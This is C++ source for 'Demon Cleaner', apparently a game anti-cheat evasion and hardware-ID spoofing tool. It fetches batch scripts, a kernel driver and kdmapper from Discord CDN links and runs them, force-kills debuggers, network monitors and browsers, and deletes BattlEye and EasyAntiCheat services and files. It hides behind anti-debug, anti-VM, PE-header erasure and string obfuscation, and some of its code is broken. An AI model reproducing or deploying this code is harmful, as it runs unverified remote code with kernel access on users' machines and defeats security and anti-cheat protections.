#include <iostream>
#include "xorstr.hpp"
#include <string>
#include <windows.h>
#include <filesystem>
#include <Urlmon.h>
#include "junk-code.h"
#include "protection.h"
#include <Wininet.h>
#include <conio.h>
#include <stdlib.h>
#include <vector>

#pragma warning(disable : 4996)
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
__declspec(naked) void AntiAttach() {
    __asm {
        jmp ExitProcess
    }
}
using namespace junkcode;


    

BOOL IsSandboxie()
{
    if (GetModuleHandle("SbieDll.dll") != NULL)
        MessageBoxA(NULL, "SANDBOXIE DETECTED.", NULL, MB_OK);
        exit(1);


    
}
string replaceAll(string subject, const string& search,
    const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}

string DownloadString(string URL) {
    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    HINTERNET urlFile;
    string rtn;
    if (interwebs) {
        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
        if (urlFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(interwebs);
            InternetCloseHandle(urlFile);
            string p = replaceAll(rtn, "|n", "\r\n");
            return p;
        }
    }
    InternetCloseHandle(interwebs);
    string p = replaceAll(rtn, "|n", "\r\n");
    return p;
}
BOOL IsVM()
{
    HKEY hKey;
    int i;
    char szBuffer[64];
    const char* szProducts[] = { "*VMWARE*", "*VBOX*", "*VIRTUAL*" };

    DWORD dwSize = sizeof(szBuffer) - 1;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueEx(hKey, "0", NULL, NULL, (unsigned char*)szBuffer, &dwSize) == ERROR_SUCCESS)
        {
            for (i = 0; i < _countof(szProducts); i++)
            {
                if (strstr(szBuffer, szProducts[i]))
                {
                    RegCloseKey(hKey);
                    MessageBoxA(NULL, "VMBOX DETECTED.", NULL, MB_OK);
                    exit(1);
                }
            }
        }

        RegCloseKey(hKey);
    }

    return FALSE;
}
void DebugChecker()
{
    FreeConsole();

    if (IsDebuggerPresent()) {
        MessageBox(0, "debugger detected", "locked!", 16);
        exit(0);
        
    }
}

void antiattachlmao()
{
    
    HANDLE hProcess = GetCurrentProcess();
    lnttirs();
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    tlmisir();
    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");
    akfuxnl();
    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);
    plvbjwh();
    SetConsoleTitle("Demon Cleaner V1.0");
    rydekem();
}
void WindowFinder()
{

    rydekem();
    if (FindWindow(NULL, "x32dbg"))
    {
        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
        exit(0);
    }
    lnttirs();
    if (FindWindow(NULL, "x64dbg"))
    {
        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
        exit(0);
    }
    plvbjwh();
    if (FindWindow(NULL, "OllyDbg"))
    {
        MessageBoxA(NULL, "Debugger Found", "Notification", MB_OK);
        exit(0);
    }
    tlmisir();
    if (FindWindow(NULL, "FiddlerEverywhere"))
    {
        MessageBoxA(NULL, "Web Debugger Found", "Notification", MB_OK);
        exit(0);
    }
    akfuxnl();
}
void Output()
{
    SetLastError(0);
  
    OutputDebugStringA("Hello, debugger");
    if (GetLastError() != 0)
    {
        MessageBoxA(NULL, "Debugger Detected", "", MB_OK);
        exit(0);
    }
    
}
void apex()
{
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    
    akfuxnl();
    std::string apex = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878306088104124416/Apex.bat"));
    std::string apexpath = "C:\Apex.bat";
    URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
    system("Start C:\Apex.bat");
    

}
void gta() 
{
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    

    akfuxnl();
    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/784033421747814400/877942560830685194/gta.bat"));
    std::string gtapath = "C:\gta.bat";
    URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
    system("Start C:\gta.bat");

}
void fortnite()
{
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    
    akfuxnl();
    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/878937010574852106/Fortnite.bat"));
    std::string fortnitepath = "C:\Fortnite.bat";
    URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
    system("Start C:\Fortnite.bat");
}
void fishingplanet()
{
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    

    akfuxnl();
    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/869679952444940298/877944079139373066/fishing-planet.bat"));
    std::string fishingplanetpath = "C:\Fishing-planet.bat";
    URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
    system("Start C:\Fishing-planet.bat");

}
void cod()
{
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    
    akfuxnl();
    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878321115284516864/cw.bat"));
    std::string codpath = "C:\Cold-Ware.bat";
    URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
    system("Start C:\Cold-Ware.bat");

    
}


void cleaner(){
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    //re use
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    MessageBoxA(NULL, "You must verify the game files if a game isn't starting and then enjoy playing.", "warning by demon",MB_OK);
    system(XorStr("cls").c_str());
    system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM clRender.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM chrome.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM msedge.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM discord.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM firefox.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM brave.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM opera.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM EpicGamesLauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-hostd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmnat.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM Spotify.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM MSBuild.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
    system(XorStr("del /F /IM D:\steam\depotcache\* 2>NULL").c_str());
    system(XorStr("del /F /IM C:\steam\depotcache\* 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Program Files (x86)\EasyAntiCheat\EasyAntiCheat.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\System32\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\Windows\System32\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("sc stop capcom").c_str());
    system(XorStr("sc delete capcom").c_str());
    system(XorStr("taskkill /F /IM cef_subprocces.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM devenv.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM LockApp.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /f /im KsDumperClient.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im GameOverlayUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamservice.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Lightshot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamwebhelper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PerfWatson2.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im vmware-tray.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im ProcessHacker.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im procmon.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im YourPhone.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im uTorrent.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im helper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Wireshark.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Fiddler.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im die.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im de4dot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Cheat Engine.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x64dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x32dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EasyAntiCheat.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im BEService.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FACEIT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrA.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrB.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
    system(XorStr("sc stop BEService >nul 2>&1").c_str());
    system(XorStr("sc delete BEService >nul 2>&1").c_str());
    system(XorStr("sc stop BEDaisy >nul 2>&1").c_str());
    system(XorStr("sc delete BEDaisy >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheat >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
    system(XorStr("sc delete EasyAntiCheat >nul 2>&1").c_str());
    system(XorStr("sc delete EasyAntiCheatSys >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im csgo.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());

}
void safeshutdown()
{
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();


    std::remove("C:\Cold-Ware.bat");
    std::remove("C:\Fishing-planet.bat");
    std::remove("C:\Apex.bat");
    std::remove("C:\gta.bat");
    std::remove("C:\Fortnite.bat");
    std::remove("C:\mapper.exe");
    std::remove("C:\woof.sys");

    std::remove("woof.sys");
    std::remove("mapper.exe");
    std::remove("Cold-Ware.bat");
    std::remove("Fishing-planet.bat");
    std::remove("Apex.bat");
    std::remove("gta.bat");
    std::remove("Fortnite.bat");

    system(XorStr("cls").c_str());
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    string a;
    std::cout << "Do you want to shutdown your pc? \nYes/No : ";
    cin >> a;
    if (a == "Yes" || a == "yes")
    {
        system(XorStr("shutdown -l").c_str());
        exit(0);
    }
    
    else 
    {
        exit(0);
        return exit(0);
    }
    
    
}
    
    
void spoofer()
{
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    


    akfuxnl();
    string spoofer = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878327452898840667/NewWoof.sys"));
    string spooferpath = "C:\\woof.sys"; //change to dir you want
    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
    {
        string mapper = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878327688694202368/kdmapper_1.exe"));
        string mapperpath = "C:\\mapper.exe";//change to dir you want
        URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
    }
    system("C:\\mapper.exe C:\\woof.sys");
    Sleep(2000);
    MessageBox(NULL, ("wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), ("warning"), MB_OK | MB_SYSTEMMODAL);
    Sleep(60000);
    rydekem();
    plvbjwh();
    tlmisir();
    akfuxnl();
    lnttirs();
    safeshutdown();
}
void mainbot()
{
    


    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    
    system(XorStr("cls").c_str());
    std::cout << "After you use the cleaner, verify the game's integrity files\n";
    Sleep(2000);
    std::cout << "\nThe cleaner deletes some files from the games. closes some processes and editing some registers.";
    Sleep(2000);
    std::cout << "\nAs well as spoofing the hwid.\n";
    std::cout << "\n";
    std::cout << "\nReinstalling the game may be more usefull then just verifing it.\n";
    Sleep(2000);
    system(XorStr("cls").c_str());
    Sleep(2000);
    cleaner();
    fishingplanet();
    gta();
    apex();
    cod();
    fortnite();
    spoofer();
    
}
void accouting()
{

    


    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    system(XorStr("cls").c_str());
    std::vector<string> ips;
    
    

    
    

    
    
    
}




int main()
{
    
    

    protection::ErasePEheader();
    antiattachlmao();
    WindowFinder();
    Output();
    accouting();

}

